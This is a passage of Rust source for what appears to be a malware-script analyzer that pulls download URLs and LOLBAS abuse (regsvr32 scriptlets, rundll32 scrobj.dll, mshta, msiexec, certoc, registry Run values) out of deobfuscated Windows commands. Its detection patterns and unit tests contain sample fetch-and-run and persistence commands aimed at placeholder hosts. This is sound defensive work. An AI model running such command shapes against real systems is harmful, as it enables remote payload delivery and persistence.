    lower.contains("url.dll,fileprotocolhandler")
        || lower.contains("url.dll,openurl")
        || lower.contains("ieframe.dll,openurl")
        || lower.contains("shdocvw.dll,openurl")
        || lower.contains("shell32.dll,shellexec_rundll")
        || lower.contains("photoviewer.dll,imageview_fullscreen")
        || lower.contains("shimgvw.dll,imageview_fullscreen")
}

fn rundll32_download_export(token: &str) -> bool {
    token
        .to_ascii_lowercase()
        .contains("scrobj.dll,generatetypelib")
}

fn scan_rundll32_download_exports_deob_text(deobfuscated: &str, env: &mut Environment) {
    if !has_rundll32_download_export_atom(deobfuscated) {
        return;
    }
    let downloads = download_urls_by_destination(env);
    let mut known_source_cmds: std::collections::HashSet<(String, String)> = env
        .traits
        .iter()
        .filter_map(|t| match t {
            Trait::UrlArgument { cmd, url } => Some((cmd.clone(), url.clone())),
            _ => None,
        })
        .collect();
    let mut known: std::collections::HashSet<String> = env
        .traits
        .iter()
        .filter_map(|t| match t {
            Trait::Download { src, .. } => Some(src.clone()),
            Trait::UrlLaunch { url, .. } => Some(url.clone()),
            Trait::UrlArgument { url, .. } => Some(url.clone()),
            Trait::CertutilDownload { url, .. } => Some(url.clone()),
            Trait::BitsadminDownload { url, .. } => Some(url.clone()),
            _ => None,
        })
        .collect();

    for line in deobfuscated.lines() {
        let tokens = split_words(line);
        for i in 0..tokens.len() {
            let cmd = command_name(strip_quotes(&tokens[i]));
            if cmd != "rundll32" && cmd != "rundll32.exe" {
                continue;
            }
            let Some(export_idx) = (i + 1..tokens.len())
                .take(4)
                .find(|idx| rundll32_download_export(strip_quotes(&tokens[*idx])))
            else {
                continue;
            };
            if let Some(url) = first_url_after(&tokens, export_idx + 1, false, true) {
                if is_noise_url(&url) || !known.insert(url.clone()) {
                    continue;
                }
                env.traits.push(Trait::Download {
                    cmd: line.to_string(),
                    src: url,
                    dst: None,
                });
                continue;
            }
            let Some(url) = rundll32_download_export_prior_download_url_after(
                &tokens,
                export_idx + 1,
                &downloads,
            ) else {
                continue;
            };
            if is_noise_url(&url) || !known_source_cmds.insert((line.to_string(), url.clone())) {
                continue;
            }
            env.traits.push(Trait::UrlArgument {
                cmd: line.to_string(),
                url,
            });
        }
    }
}

fn rundll32_download_export_prior_download_url_after(
    tokens: &[String],
    start: usize,
    downloads: &std::collections::HashMap<String, String>,
) -> Option<String> {
    for token in tokens.iter().skip(start).take(4) {
        let candidate = trim_url_suffix(strip_quotes(token)).trim();
        if candidate.is_empty() || candidate.starts_with(['/', '-']) {
            continue;
        }
        if let Some(url) = url_for_download_destination(candidate, downloads) {
            return Some(url);
        }
    }
    None
}

fn scan_glued_rundll32_deob_text(deobfuscated: &str, env: &mut Environment) {
    if !contains_ascii_case_insensitive_atom(deobfuscated, b"rundll32") {
        return;
    }
    let downloads = download_urls_by_destination(env);
    let mut known_cmds: std::collections::HashSet<String> = env
        .traits
        .iter()
        .filter_map(|t| match t {
            Trait::Rundll32 { cmd, .. } => Some(cmd.clone()),
            _ => None,
        })
        .collect();

    for line in deobfuscated.lines() {
        if !contains_ascii_case_insensitive_atom(line, b"rundll32") {
            continue;
        }
        for caps in GLUED_RUNDLL32_RE.captures_iter(line) {
            let Some(cmd_match) = caps.get(1) else {
                continue;
            };
            let Some(dll_match) = caps.get(2) else {
                continue;
            };
            if dll_match.as_str().to_ascii_lowercase().starts_with(".exe") {
                continue;
            }
            let cmd = cmd_match.as_str().trim().to_string();
            if !known_cmds.insert(cmd.clone()) {
                continue;
            }
            let dll = strip_quotes(dll_match.as_str());
            let url = url_for_download_destination(dll, &downloads);
            env.traits.push(Trait::Rundll32 { cmd, url });
        }
        for caps in SPACED_RUNDLL32_RE.captures_iter(line) {
            let Some(cmd_match) = caps.get(1) else {
                continue;
            };
            let dll = caps
                .get(2)
                .or_else(|| caps.get(3))
                .map(|m| strip_quotes(m.as_str()))
                .unwrap_or("");
            let Some(url) = url_for_download_destination(dll, &downloads) else {
                continue;
            };
            let cmd = cmd_match.as_str().trim().to_string();
            if !known_cmds.insert(cmd.clone()) {
                continue;
            }
            env.traits.push(Trait::Rundll32 {
                cmd,
                url: Some(url),
            });
        }
    }
}

fn scan_mshta_local_deob_text(deobfuscated: &str, env: &mut Environment) {
    if !contains_ascii_case_insensitive_atom(deobfuscated, b"mshta") {
        return;
    }
    let downloads = download_urls_by_destination(env);
    if downloads.is_empty() {
        return;
    }
    let mut known: std::collections::HashSet<(String, String)> = env
        .traits
        .iter()
        .filter_map(|t| match t {
            Trait::UrlArgument { cmd, url } => Some((cmd.clone(), url.clone())),
            _ => None,
        })
        .collect();

    for line in deobfuscated.lines() {
        if !contains_ascii_case_insensitive_atom(line, b"mshta") {
            continue;
        }
        let tokens = split_words(line);
        for i in 0..tokens.len() {
            let cmd = command_name(strip_quotes(&tokens[i]));
            if cmd != "mshta" && cmd != "mshta.exe" {
                continue;
            }
            let Some(url) = mshta_prior_download_url_after(&tokens, i + 1, &downloads) else {
                continue;
            };
            if is_noise_url(&url) || !known.insert((line.to_string(), url.clone())) {
                continue;
            }
            env.traits.push(Trait::UrlArgument {
                cmd: line.to_string(),
                url,
            });
        }
    }
}

fn mshta_prior_download_url_after(
    tokens: &[String],
    start: usize,
    downloads: &std::collections::HashMap<String, String>,
) -> Option<String> {
    for token in tokens.iter().skip(start).take(8) {
        let candidate = trim_url_suffix(strip_quotes(token)).trim();
        if candidate.is_empty() || candidate.starts_with(['/', '-']) {
            continue;
        }
        if !is_hta_target(candidate) {
            continue;
        }
        if let Some(url) = url_for_download_destination(candidate, downloads) {
            return Some(url);
        }
    }
    None
}

fn is_hta_target(candidate: &str) -> bool {
    let lower = trim_url_suffix(candidate).to_ascii_lowercase();
    [".hta", ".htm", ".html"]
        .iter()
        .any(|suffix| lower.ends_with(suffix))
}

fn download_urls_by_destination(env: &Environment) -> std::collections::HashMap<String, String> {
    let mut out = std::collections::HashMap::new();
    for t in &env.traits {
        let (src, dst) = match t {
            Trait::Download {
                src,
                dst: Some(dst),
                ..
            } => (src, dst),
            Trait::CertutilDownload { url, dst } | Trait::BitsadminDownload { url, dst } => {
                (url, dst)
            }
            _ => continue,
        };
        let key = normalized_path_key(dst);
        if !key.is_empty() {
            out.entry(key).or_insert_with(|| src.clone());
        }
        let basename = normalized_path_basename(dst);
        if !basename.is_empty() {
            out.entry(basename).or_insert_with(|| src.clone());
        }
    }
    out
}

fn url_for_download_destination(
    dll: &str,
    downloads: &std::collections::HashMap<String, String>,
) -> Option<String> {
    let key = normalized_path_key(dll);
    if let Some(url) = downloads.get(&key) {
        return Some(url.clone());
    }
    if key.contains('\\') {
        return None;
    }
    downloads.get(&normalized_path_basename(dll)).cloned()
}

fn normalized_path_key(path: &str) -> String {
    strip_quotes(path)
        .trim()
        .trim_start_matches(".\\")
        .replace('/', "\\")
        .to_ascii_lowercase()
}

fn normalized_path_basename(path: &str) -> String {
    normalized_path_key(path)
        .rsplit('\\')
        .next()
        .unwrap_or("")
        .to_string()
}

fn scan_desktopimgdownldr_deob_text(deobfuscated: &str, env: &mut Environment) {
    if !has_desktopimgdownldr_atom(deobfuscated) {
        return;
    }
    let mut known: std::collections::HashSet<String> = env
        .traits
        .iter()
        .filter_map(|t| match t {
            Trait::Download { src, .. } => Some(src.clone()),
            Trait::UrlArgument { url, .. } => Some(url.clone()),
            Trait::UrlLaunch { url, .. } => Some(url.clone()),
            Trait::CertutilDownload { url, .. } => Some(url.clone()),
            Trait::BitsadminDownload { url, .. } => Some(url.clone()),
            _ => None,
        })
        .collect();

    for line in deobfuscated.lines() {
        let tokens = split_words(line);
        for i in 0..tokens.len() {
            let cmd = command_name(strip_quotes(&tokens[i]));
            if cmd != "desktopimgdownldr" && cmd != "desktopimgdownldr.exe" {
                continue;
            }
            let Some(url) = desktopimgdownldr_lockscreen_url_after(&tokens, i + 1) else {
                continue;
            };
            if is_noise_url(&url) || !known.insert(url.clone()) {
                continue;
            }
            push_lolbas_once(env, "desktopimgdownldr", line);
            env.traits.push(Trait::Download {
                cmd: line.to_string(),
                src: url,
                dst: None,
            });
        }
    }
}

fn scan_certoc_deob_text(deobfuscated: &str, env: &mut Environment) {
    if !has_certoc_getcacaps_atom(deobfuscated) {
        return;
    }
    let mut known: std::collections::HashSet<String> = env
        .traits
        .iter()
        .filter_map(|t| match t {
            Trait::Download { src, .. } => Some(src.clone()),
            Trait::UrlArgument { url, .. } => Some(url.clone()),
            Trait::UrlLaunch { url, .. } => Some(url.clone()),
            Trait::CertutilDownload { url, .. } => Some(url.clone()),
            Trait::BitsadminDownload { url, .. } => Some(url.clone()),
            _ => None,
        })
        .collect();

    for line in deobfuscated.lines() {
        let tokens = split_words(line);
        for i in 0..tokens.len() {
            let cmd = command_name(strip_quotes(&tokens[i]));
            if cmd != "certoc" && cmd != "certoc.exe" {
                continue;
            }
            let Some(url) = certoc_getcacaps_url_after(&tokens, i + 1) else {
                continue;
            };
            if is_noise_url(&url) || !known.insert(url.clone()) {
                continue;
            }
            push_lolbas_once(env, "certoc", line);
            env.traits.push(Trait::Download {
                cmd: line.to_string(),
                src: url,
                dst: None,
            });
        }
    }
}

fn has_rundll32_download_export_atom(text: &str) -> bool {
    contains_ascii_case_insensitive_atom(text, b"rundll32")
        && contains_ascii_case_insensitive_atom(text, b"scrobj.dll")
        && contains_ascii_case_insensitive_atom(text, b"generatetypelib")
}

fn has_desktopimgdownldr_atom(text: &str) -> bool {
    contains_ascii_case_insensitive_atom(text, b"desktopimgdownldr")
        && contains_ascii_case_insensitive_atom(text, b"lockscreenurl")
}

fn has_certoc_getcacaps_atom(text: &str) -> bool {
    contains_ascii_case_insensitive_atom(text, b"certoc")
        && contains_ascii_case_insensitive_atom(text, b"getcacaps")
}

fn certoc_getcacaps_url_after(tokens: &[String], start: usize) -> Option<String> {
    flag_url_value_after(tokens, start, &["-getcacaps", "/getcacaps"])
}

fn desktopimgdownldr_lockscreen_url_after(tokens: &[String], start: usize) -> Option<String> {
    flag_url_value_after(tokens, start, &["/lockscreenurl", "-lockscreenurl"])
}

fn scan_url_variable_assignments(deobfuscated: &str, env: &mut Environment) {
    if !has_url_variable_assignment_atom(deobfuscated) {
        return;
    }
    let mut known: std::collections::HashSet<String> = env
        .traits
        .iter()
        .filter_map(|t| match t {
            Trait::UrlVariable { url, .. } => Some(url.clone()),
            Trait::UrlLaunch { url, .. } => Some(url.clone()),
            Trait::RegistryUrl { url, .. } => Some(url.clone()),
            Trait::Download { src, .. } => Some(src.clone()),
            Trait::CertutilDownload { url, .. } => Some(url.clone()),
            Trait::BitsadminDownload { url, .. } => Some(url.clone()),
            _ => None,
        })
        .collect();

    for line in deobfuscated.lines() {
        if !has_url_variable_assignment_atom(line) {
            continue;
        }
        for caps in CMD_URL_VAR_RE.captures_iter(line) {
            emit_url_variable(
                caps.get(1).map(|m| m.as_str()),
                caps.get(2).map(|m| m.as_str()),
                line,
                env,
                &mut known,
            );
        }
        for caps in CMD_SCHEMELESS_URL_VAR_RE.captures_iter(line) {
            emit_url_variable(
                caps.get(1).map(|m| m.as_str()),
                caps.get(2).map(|m| m.as_str()),
                line,
                env,
                &mut known,
            );
        }
        for caps in PS_URL_VAR_RE.captures_iter(line) {
            emit_url_variable(
                caps.get(1).map(|m| m.as_str()),
                caps.get(2).map(|m| m.as_str()),
                line,
                env,
                &mut known,
            );
        }
        for caps in PS_SCHEMELESS_URL_VAR_RE.captures_iter(line) {
            emit_url_variable(
                caps.get(1).map(|m| m.as_str()),
                caps.get(2).map(|m| m.as_str()),
                line,
                env,
                &mut known,
            );
        }
    }
}

fn has_url_variable_assignment_atom(text: &str) -> bool {
    if !text.as_bytes().contains(&b'=') {
        return false;
    }
    if [
        b"http:".as_slice(),
        b"https:".as_slice(),
        b"ftp:".as_slice(),
        b"file:".as_slice(),
    ]
    .iter()
    .any(|atom| contains_ascii_case_insensitive_atom(text, atom))
    {
        return true;
    }
    contains_ascii_case_insensitive_atom(text, b"url") && text.contains('/') && text.contains('.')
}

#[cfg(test)]
mod url_variable_assignment_prefilter_tests {
    use super::has_url_variable_assignment_atom;

    #[test]
    fn prefilter_allows_cmd_and_powershell_url_assignments() {
        assert!(has_url_variable_assignment_atom(
            r#"set "u=https://evil.example/p""#
        ));
        assert!(has_url_variable_assignment_atom(
            r#"$u = 'ftp://evil.example/p'"#
        ));
        assert!(has_url_variable_assignment_atom(
            r#"set payloadUrl=evil.example/payload.exe"#
        ));
        assert!(has_url_variable_assignment_atom(
            r#"$payloadUrl = "evil.example/payload.exe""#
        ));
    }

    #[test]
    fn prefilter_blocks_generic_url_words_without_assignment() {
        assert!(!has_url_variable_assignment_atom(
            "echo https://evil.example/p"
        ));
        assert!(!has_url_variable_assignment_atom(
            "set name=not-a-url && echo url"
        ));
    }
}

fn scan_registry_url_values(deobfuscated: &str, env: &mut Environment) {
    if !has_registry_url_values_atom(deobfuscated) {
        return;
    }

    let mut known: std::collections::HashSet<String> = env
        .traits
        .iter()
        .filter_map(|t| match t {
            Trait::RegistryUrl { url, .. } => Some(url.clone()),
            Trait::UrlVariable { url, .. } => Some(url.clone()),
            Trait::UrlLaunch { url, .. } => Some(url.clone()),
            Trait::Download { src, .. } => Some(src.clone()),
            Trait::CertutilDownload { url, .. } => Some(url.clone()),
            Trait::BitsadminDownload { url, .. } => Some(url.clone()),
            _ => None,
        })
        .collect();

    for line in deobfuscated.lines() {
        let tokens = split_words(line);
        if tokens
            .first()
            .map(|token| command_name(strip_quotes(token)) != "reg")
            .unwrap_or(true)
            && !tokens
                .iter()
                .any(|token| command_name(strip_quotes(token)) == "reg")
        {
            continue;
        }

        let mut value_name: Option<String> = None;
        let mut url: Option<String> = None;
        let mut i = 0;
        while i < tokens.len() {
            let token = strip_quotes(&tokens[i]);
            if token.eq_ignore_ascii_case("/v") {
                value_name = tokens.get(i + 1).map(|next| strip_quotes(next).to_string());
                i += 2;
                continue;
            }
            if token.eq_ignore_ascii_case("/ve") {
                value_name = Some("(Default)".to_string());
                i += 1;
                continue;
            }
            if token.eq_ignore_ascii_case("/d") {
                url = tokens.get(i + 1).and_then(|next| {
                    let value = trim_url_suffix(strip_quotes(next));
                    normalize_liberal_url_token(value)
                        .or_else(|| normalize_schemeless_domain_path_token(value))
                });
                i += 2;
                continue;
            }
            i += 1;
        }
        let (Some(value), Some(url)) = (value_name, url) else {
            continue;
        };
        if is_noise_url(&url) || !known.insert(url.clone()) {
            continue;
        }
        env.traits.push(Trait::RegistryUrl {
            cmd: line.to_string(),
            value,
            url,
        });
    }
}

fn has_registry_url_values_atom(text: &str) -> bool {
    let lower = text.to_ascii_lowercase();
    lower.contains("reg") && lower.contains("/d")
}

#[cfg(test)]
mod registry_url_values_prefilter_tests {
    use super::has_registry_url_values_atom;

    #[test]
    fn prefilter_allows_reg_url_value_shapes() {
        assert!(has_registry_url_values_atom(
            r#"reg add HKCU\Software\Run /v Updater /d https://evil.example/a.exe"#
        ));
    }

    #[test]
    fn prefilter_blocks_unrelated_registry_text() {
        assert!(!has_registry_url_values_atom(
            r#"reg query HKCU\Software\Classes"#
        ));
        assert!(!has_registry_url_values_atom(
            r#"echo https://evil.example/a.exe"#
        ));
    }
}

fn emit_url_variable(
    name: Option<&str>,
    url: Option<&str>,
    line: &str,
    env: &mut Environment,
    known: &mut std::collections::HashSet<String>,
) {
    let (Some(name), Some(url)) = (name, url) else {
        return;
    };
    let value = trim_url_suffix(url);
    let Some(url) = normalize_liberal_url_token(value)
        .or_else(|| normalize_schemeless_domain_path_token(value))
    else {
        return;
    };
    if is_noise_url(&url) || !known.insert(url.clone()) {
        return;
    }
    env.traits.push(Trait::UrlVariable {
        name: name.to_string(),
        url,
        cmd: line.to_string(),
    });
}

fn trim_url_suffix(url: &str) -> &str {
    trim_liberal_url_suffix(url)
}

fn scan_process_url_arguments(deobfuscated: &str, env: &mut Environment) {
    if !has_process_url_argument_atom(deobfuscated) {
        return;
    }

    let downloads = download_urls_by_destination(env);
    let mut known_source_cmds: std::collections::HashSet<(String, String)> = env
        .traits
        .iter()
        .filter_map(|t| match t {
            Trait::UrlArgument { cmd, url } => Some((cmd.clone(), url.clone())),
            _ => None,
        })
        .collect();
    let mut known: std::collections::HashSet<String> = env
        .traits
        .iter()
        .filter_map(|t| match t {
            Trait::UrlArgument { url, .. } => Some(url.clone()),
            Trait::UrlLaunch { url, .. } => Some(url.clone()),
            Trait::UrlVariable { url, .. } => Some(url.clone()),
            Trait::RegistryUrl { url, .. } => Some(url.clone()),
            Trait::Download { src, .. } => Some(src.clone()),
            Trait::CertutilDownload { url, .. } => Some(url.clone()),
            Trait::BitsadminDownload { url, .. } => Some(url.clone()),
            _ => None,
        })
        .collect();

    for line in deobfuscated.lines() {
        if !has_process_url_argument_line_atom(line) {
            continue;
        }
        for caps in PROCESS_URL_ARG_RE.captures_iter(line) {
            let Some(url) = caps
                .get(1)
                .and_then(|m| normalize_liberal_url_token(trim_url_suffix(m.as_str())))
            else {
                continue;
            };
            if is_noise_url(&url) || !known.insert(url.clone()) {
                continue;
            }
            env.traits.push(Trait::UrlArgument {
                cmd: line.to_string(),
                url,
            });
        }

        let tokens = split_words(line);
        for i in 0..tokens.len() {
            let cmd = command_name(strip_quotes(&tokens[i]));
            if cmd != "regsvr32" && cmd != "regsvr32.exe" {
                continue;
            }
            let Some(url) = regsvr32_scriptlet_url_after(&tokens, i + 1) else {
                continue;
            };
            if is_noise_url(&url) {
                continue;
            }
            push_lolbas_once(env, "regsvr32", line);
            if !known.insert(url.clone()) {
                continue;
            }
            env.traits.push(Trait::UrlArgument {
                cmd: line.to_string(),
                url,
            });
        }
        for i in 0..tokens.len() {
            let cmd = command_name(strip_quotes(&tokens[i]));
            if cmd != "regsvr32" && cmd != "regsvr32.exe" {
                continue;
            }
            let Some(url) = regsvr32_prior_download_url_after(&tokens, i + 1, &downloads) else {
                continue;
            };
            if is_noise_url(&url) || !known_source_cmds.insert((line.to_string(), url.clone())) {
                continue;
            }
            push_lolbas_once(env, "regsvr32", line);
            env.traits.push(Trait::UrlArgument {
                cmd: line.to_string(),
                url,
            });
        }
        for i in 0..tokens.len() {
            let cmd = command_name(strip_quotes(&tokens[i]));
            if cmd != "msiexec" && cmd != "msiexec.exe" {
                continue;
            }
            let Some(url) = msiexec_prior_download_url_after(&tokens, i + 1, &downloads) else {
                continue;
            };
            if is_noise_url(&url) || !known_source_cmds.insert((line.to_string(), url.clone())) {
                continue;
            }
            push_lolbas_once(env, "msiexec", line);
            env.traits.push(Trait::UrlArgument {
                cmd: line.to_string(),
                url,
            });
        }

        for i in 0..tokens.len() {
            let cmd = command_name(strip_quotes(&tokens[i]));
            if cmd != "certreq" && cmd != "certreq.exe" {
                continue;
            }
            let Some(url) = certreq_config_url_after(&tokens, i + 1) else {
                continue;
            };
            if is_noise_url(&url) {
                continue;
            }
            push_lolbas_once(env, "certreq", line);
            if !known.insert(url.clone()) {
                continue;
            }
            env.traits.push(Trait::UrlArgument {
                cmd: line.to_string(),
                url,
            });
        }

        if tokens.len() < 2 {
            continue;
        }
        let cmd = command_name(strip_quotes(&tokens[0]));
        if !is_url_argument_process(&cmd) || is_url_launcher_command(&cmd) {
            continue;
        }
        let Some(url) =
            first_url_after(&tokens, 1, cmd == "msiexec" || cmd == "msiexec.exe", false)
        else {
            continue;
        };
        if is_noise_url(&url) {
            continue;
        }
        if cmd == "msiexec" || cmd == "msiexec.exe" {
            push_lolbas_once(env, "msiexec", line);
        }
        if !known.insert(url.clone()) {
            continue;
        }
        env.traits.push(Trait::UrlArgument {
            cmd: line.to_string(),
            url,
        });
    }
}

fn has_process_url_argument_atom(text: &str) -> bool {
    let has_urlish = [
        b"http:".as_slice(),
        b"https:".as_slice(),
        b"file:".as_slice(),
    ]
    .iter()
    .any(|atom| contains_ascii_case_insensitive_atom(text, atom))
        || (text.contains('/') && text.contains('.'));
    if !has_urlish {
        return false;
    }
    [
        b".exe".as_slice(),
        b".com".as_slice(),
        b".scr".as_slice(),
        b".bat".as_slice(),
        b".cmd".as_slice(),
        b"regsvr32".as_slice(),
        b"certreq".as_slice(),
        b"msiexec".as_slice(),
    ]
    .iter()
    .any(|atom| contains_ascii_case_insensitive_atom(text, atom))
}

fn has_process_url_argument_line_atom(line: &str) -> bool {
    if !has_process_url_argument_atom(line) {
        return false;
    }
    let trimmed = line.trim_start_matches(['@', ' ', '\t', '(']);
    let first = trimmed
        .split_ascii_whitespace()
        .next()
        .unwrap_or("")
        .trim_matches('"')
        .to_ascii_lowercase();
    !matches!(first.as_str(), "set" | "setx" | "echo" | "rem" | "::")
}

#[cfg(test)]
mod process_url_argument_prefilter_tests {
    use super::{has_process_url_argument_atom, has_process_url_argument_line_atom};

    #[test]
    fn prefilter_allows_supported_process_url_argument_shapes() {
        assert!(has_process_url_argument_atom(
            r#"C:\Users\Public\calc.com "https://skynetx.com.br/html.html""#
        ));
        assert!(has_process_url_argument_atom(
            "regsvr32 /s /n /u /i:http://regsvr32.example/payload.sct scrobj.dll"
        ));
        assert!(has_process_url_argument_atom(
            r#"certreq -Post -config "https://certreq.example/submit" req out"#
        ));
        assert!(has_process_url_argument_atom(
            "msiexec /quiet /imsiexec-attached.example/setup.msi"
        ));
    }

    #[test]
    fn prefilter_blocks_unrelated_url_text() {
        assert!(!has_process_url_argument_atom(
            "echo https://plain.example/payload"
        ));
        assert!(!has_process_url_argument_line_atom(
            "set url=plain.example/payload.exe"
        ));
    }
}

fn certreq_config_url_after(tokens: &[String], start: usize) -> Option<String> {
    flag_url_value_after(tokens, start, &["-config", "/config"])
}

fn regsvr32_scriptlet_url_after(tokens: &[String], start: usize) -> Option<String> {
    let limit = tokens.len().min(start.saturating_add(12));
    for i in start..limit {
        let token = strip_quotes(&tokens[i]);
        let lower = token.to_ascii_lowercase();
        let candidate = if regsvr32_attached_i_arg(&lower) {
            token.get(3..)
        } else if lower == "/i" || lower == "-i" {
            tokens.get(i + 1).map(|next| strip_quotes(next))
        } else {
            None
        };
        let Some(candidate) = candidate else {
            continue;
        };
        let candidate = trim_url_suffix(candidate);
        if let Some(url) = normalize_liberal_url_token(candidate)
            .or_else(|| normalize_schemeless_domain_path_token(candidate))
        {
            return Some(url);
        }
    }
    None
}

fn regsvr32_prior_download_url_after(
    tokens: &[String],
    start: usize,
    downloads: &std::collections::HashMap<String, String>,
) -> Option<String> {
    let limit = tokens.len().min(start.saturating_add(12));
    for i in start..limit {
        let token = strip_quotes(&tokens[i]).trim();
        let lower = token.to_ascii_lowercase();
        let candidate = if regsvr32_attached_i_arg(&lower) {
            token.get(3..)
        } else if lower == "/i" || lower == "-i" {
            tokens.get(i + 1).map(|next| strip_quotes(next).trim())
        } else {
            None
        };
        let Some(candidate) = candidate else {
            continue;
        };
        let candidate = trim_url_suffix(candidate).trim();
        if let Some(url) = url_for_download_destination(candidate, downloads) {
            return Some(url);
        }
    }
    for token in tokens.iter().skip(start).take(12) {
        let candidate = trim_url_suffix(strip_quotes(token)).trim();
        if candidate.is_empty() || candidate.starts_with(['/', '-']) {
            continue;
        }
        if !regsvr32_loadable_target(candidate) {
            continue;
        }
        if let Some(url) = url_for_download_destination(candidate, downloads) {
            return Some(url);
        }
    }
    None
}

fn regsvr32_loadable_target(token: &str) -> bool {
    let trimmed = trim_url_suffix(token).to_ascii_lowercase();
    [".dll", ".sct", ".ocx", ".cpl"]
        .iter()
        .any(|suffix| trimmed.ends_with(suffix))
}

fn regsvr32_attached_i_arg(lower: &str) -> bool {
    lower.starts_with("/i:")
        || lower.starts_with("-i:")
        || lower.starts_with("/i=")
        || lower.starts_with("-i=")
}

fn msiexec_prior_download_url_after(
    tokens: &[String],
    start: usize,
    downloads: &std::collections::HashMap<String, String>,
) -> Option<String> {
    let limit = tokens.len().min(start.saturating_add(12));
    for i in start..limit {
        let Some(candidate) = msiexec_package_candidate(&tokens[i], tokens.get(i + 1)) else {
            continue;
        };
        if let Some(url) = url_for_download_destination(&candidate, downloads) {
            return Some(url);
        }
    }
    None
}

fn msiexec_package_candidate<'a>(token: &'a str, next: Option<&'a String>) -> Option<String> {
    let token = strip_quotes(token).trim();
    let lower = token.to_ascii_lowercase();
    for prefix in [
        "/i", "-i", "/a", "-a", "/p", "-p", "/package", "-package", "/update", "-update",
    ] {
        if lower == prefix {
            return next
                .map(|value| trim_url_suffix(strip_quotes(value)).trim().to_string())
                .filter(|candidate| !candidate.is_empty());
        }
        let Some(rest) = lower.strip_prefix(prefix) else {
            continue;
        };
        let original_rest = &token[token.len() - rest.len()..];
        let candidate = trim_url_suffix(original_rest.trim_start_matches([':', '=']))
            .trim()
            .to_string();
        if !candidate.is_empty() {
            return Some(candidate);
        }
    }
    None
}

fn url_launch_after_start(tokens: &[String], mut i: usize) -> Option<String> {
    let mut skipped_title = false;
    while i < tokens.len() {
        let token = strip_quotes(&tokens[i]);
        let lower = token.to_ascii_lowercase();
        if token.is_empty() {
            skipped_title = true;
            i += 1;
            continue;
        }
        if is_start_flag(&lower) {
            i += 1;
            continue;
        }
        if looks_like_direct_url(token) || normalize_schemeless_domain_path_token(token).is_some() {
            let url = normalize_url_obfuscation(token);
            return normalize_liberal_url_token(&url)
                .or_else(|| normalize_schemeless_domain_path_token(&url));
        }
        if is_url_launcher_command(&command_name(token)) {
            return first_url_after(tokens, i + 1, false, true);
        }
        if !skipped_title
            && tokens
                .get(i + 1)
                .map(|next| {
                    let next = strip_quotes(next);
                    looks_like_direct_url(next)
                        || normalize_schemeless_domain_path_token(next).is_some()
                })
                .unwrap_or(false)
        {
            skipped_title = true;
            i += 1;
            continue;
        }
        return None;
    }
    None
}

fn first_url_after(
    tokens: &[String],
    start: usize,
    allow_msiexec_attached: bool,
    allow_schemeless: bool,
) -> Option<String> {
    tokens
        .iter()
        .skip(start)
        .map(|token| strip_quotes(token).trim_start_matches(['"', '\'']))
        .find_map(|token| {
            if looks_like_direct_url(token) {
                return Some(token);
            }
            if allow_msiexec_attached {
                if let Some(attached) = msiexec_attached_url_token(token) {
                    return Some(attached);
                }
                if normalize_schemeless_domain_path_token(token).is_some() {
                    return Some(token);
                }
            }
            if allow_schemeless && normalize_schemeless_domain_path_token(token).is_some() {
                return Some(token);
            }
            if allow_schemeless {
                if let Some(attached) = ps_url_launch_attached_url_token(token) {
                    return Some(attached);
                }
            }
            None
        })
        // Truncate at shell/PS terminators that split.rs / split_words
        // didn't split on (e.g. `URL);Invoke-NullAMSI;function` in a
        // PS one-liner that has the URL embedded in a parenthesized
        // expression — `iex (iwr URL);next-stmt` etc.).
        .map(|token| {
            let end = token
                .find([')', '(', ';', ',', '"', '\'', '`'])
                .unwrap_or(token.len());
            let url = normalize_url_obfuscation(&token[..end]);
            normalize_liberal_url_token(&url)
                .or_else(|| normalize_schemeless_domain_path_token(&url))
                .unwrap_or(url)
        })
}

fn ps_url_launch_attached_url_token(token: &str) -> Option<&str> {
    let lower = token.to_ascii_lowercase();
    let rest = lower.strip_prefix('-')?;
    let split = rest.find([':', '='])?;
    let name = &rest[..split];
    if !ps_url_launch_attached_param_name(name) {
        return None;
    }
    let candidate = &token[1 + split + 1..];
    if looks_like_direct_url(candidate)
        || normalize_schemeless_domain_path_token(candidate).is_some()
    {
        return Some(candidate);
    }
    None
}

fn ps_url_launch_attached_param_name(name: &str) -> bool {
    !name.is_empty()
        && ("filepath".starts_with(name)
            || "path".starts_with(name)
            || "literalpath".starts_with(name))
}

fn msiexec_attached_url_token(token: &str) -> Option<&str> {
    let lower = token.to_ascii_lowercase();
    for prefix in [
        "/i", "-i", "/a", "-a", "/p", "-p", "/package", "-package", "/update", "-update",
    ] {
        let Some(rest) = lower.strip_prefix(prefix) else {
            continue;
        };
        let original_rest = &token[token.len() - rest.len()..];
        let candidate = original_rest.trim_start_matches([':', '=']);
        if looks_like_direct_url(candidate)
            || normalize_schemeless_domain_path_token(candidate).is_some()
        {
            return Some(candidate);
        }
    }
    None
}

/// Collapse common in-quote URL obfuscation tricks that survive into
/// our extracted URL string. Currently:
///   * `""` — empty double-quote pair inside `start "" "url""more""bits"`
///     is used to splinter scanners that key on the literal scheme/host
///     text. In CMD, `""` inside a quoted argument escapes to a literal
///     `"`, but the obfuscator's *intent* (and what ShellExecute/IE end
///     up dereferencing in practice on Windows since `"` is not a URL
///     char) is to make `""` evaporate. We collapse it so the IOC
///     output matches the analyst's mental model.
fn normalize_url_obfuscation(url: &str) -> String {
    if url.contains("\"\"") {
        url.replace("\"\"", "")
    } else {
        url.to_string()
    }
}

fn looks_like_direct_url(token: &str) -> bool {
    looks_like_liberal_url(token)
}

fn is_start_flag(token: &str) -> bool {
    matches!(
        token,
        "/min"
            | "/max"
            | "/wait"
            | "/low"
            | "/normal"
            | "/abovenormal"
            | "/belownormal"
            | "/high"
            | "/realtime"
            | "/b"
            | "/i"
            | "/w"
    )
}

fn is_url_launcher_command(cmd: &str) -> bool {
    matches!(
        cmd,
        "explorer"
            | "explorer.exe"
            | "start-process"
            | "saps"
            | "invoke-item"
            | "ii"
            | "chrome"
            | "chrome.exe"
            | "msedge"
            | "msedge.exe"
            | "iexplore"
            | "iexplore.exe"
            | "firefox"
            | "firefox.exe"
            | "brave"
            | "brave.exe"
            | "opera"
            | "opera.exe"
            | "hh"
            | "hh.exe"
    )
}

fn is_url_argument_process(cmd: &str) -> bool {
    if cmd == "msiexec" {
        return true;
    }

    // Windows file extensions are case-insensitive — `Notepad.EXE`
    // / `payload.Bat` are valid invocations. Lowercase once for cheap
    // suffix check.
    let lc = cmd.to_ascii_lowercase();
    lc.ends_with(".exe")
        || lc.ends_with(".com")
        || lc.ends_with(".scr")
        || lc.ends_with(".bat")
        || lc.ends_with(".cmd")
}

fn command_name(token: &str) -> String {
    let token = token
